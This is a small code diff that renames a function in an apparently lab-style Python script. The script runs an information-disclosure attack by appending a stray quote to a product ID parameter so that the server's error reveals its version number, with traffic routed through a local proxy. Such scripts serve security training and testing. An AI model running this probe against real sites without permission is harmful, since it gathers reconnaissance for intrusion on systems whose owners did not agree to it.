@@ -10,7 +10,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def output_version_number(url, session):
+def get_version_number(url, session):
     product_url = url + "/product?productId='"
     response = session.get(
         product_url,
@@ -25,7 +25,7 @@ if __name__ == "__main__":
         url = sys.argv[1].strip()
         session = requests.Session()
         print("[+] Starting Information Disclosure attack...")
-        version_number = output_version_number(url, session)
+        version_number = get_version_number(url, session)
         print("[+] The version number is '%s'" % version_number)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
